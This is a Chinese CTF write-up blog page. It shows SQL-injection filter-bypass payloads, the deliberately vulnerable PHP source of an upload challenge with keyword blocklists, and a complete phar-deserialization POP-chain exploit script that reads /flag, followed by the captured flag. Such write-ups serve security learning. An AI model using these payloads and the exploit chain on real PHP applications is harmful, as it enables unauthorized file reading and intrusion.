<p><code>fuckyoufuck&#39;/**/or/**/1^&#39;0</code></p>
<p>最后payload:<code>admin&#39;/*ffuuucckyou*/or/**/&#39;</code></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>已知文件:<code>file.php,download.php,index.php,upload_file.php</code></p>
<p>download.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$name</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\.|etc|var|tmp|usr/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/base|class|file|function|index|upload_file/i&#x27;</span>, <span class="variable">$name</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$name</span> = safe_replace(<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/base|class|file|function|index|upload_file/i&#x27;</span>, <span class="variable">$name</span>))&#123;</span><br><span class="line">                <span class="variable">$filename</span> = <span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">                <span class="variable">$dir</span> =<span class="string">&quot;./&quot;</span>;</span><br><span class="line">                <span class="variable">$down_host</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = fopen ( <span class="variable">$dir</span>.<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span> );</span><br><span class="line">                    Header ( <span class="string">&quot;Content-type: application/octet-stream&quot;</span> );</span><br><span class="line">                    Header ( <span class="string">&quot;Accept-Ranges: bytes&quot;</span> );</span><br><span class="line">                    Header ( <span class="string">&quot;Accept-Length: &quot;</span> . filesize ( <span class="variable">$dir</span>.<span class="variable">$filename</span> ) );</span><br><span class="line">                    Header ( <span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="variable">$filename</span> );</span><br><span class="line">                    <span class="keyword">echo</span> fread ( <span class="variable">$file</span>, filesize ( <span class="variable">$dir</span> . <span class="variable">$filename</span> ) );</span><br><span class="line">                    fclose ( <span class="variable">$file</span> );</span><br><span class="line">                    <span class="keyword">exit</span> ();</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> (<span class="string">&quot;file doesn&#x27;t exist.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$name</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>file.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\/|\.\.|flag/i&#x27;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>); </span><br><span class="line">&#125;<span class="keyword">elseif</span>(!preg_match(<span class="string">&#x27;/\//i&#x27;</span>,<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        unlink(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span>= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$text</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span>= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$text</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|flag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>分析发现一堆类，且file_exists可以触发phar反序列化漏洞</p>
<p>pop链:</p>
<p><code>sh0w($str=new S6ow)-&gt;S6ow($file=new Show,$_show=&quot;file_get&quot;)-&gt;Show($source=&#39;/flag&#39;)</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$text</span>= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span>= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_show</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=<span class="keyword">new</span> Show;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_show=<span class="string">&quot;file_get&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="string">&quot;_show&quot;</span>;</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">print</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">            <span class="comment">//$this-&gt;file_get($arguments);</span></span><br><span class="line">            <span class="comment">//$this-&gt;&#123;$name&#125;=&quot;file_get&quot;</span></span><br><span class="line">            <span class="comment">//$name=_show</span></span><br><span class="line">            <span class="comment">//$file=new Show;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str =<span class="keyword">new</span> S6ow;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Sh0w();</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;hello.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar,phar伪协议不用phar后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub,只要后面部分为__HALT_COMPILER(); </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flag{a592b240-32ae-4381-a0ab-83790c98ca28}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" data-id="cku89gxvs007cwvosgrf4bk4r" data-title="巅峰极客" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-巅峰极客2020wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="巅峰极客2020"><a href="#巅峰极客2020" class="headerlink" title="巅峰极客2020"></a>巅峰极客2020</h1><p><strong>文章首发于<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/218977">安全客</a></strong></p>
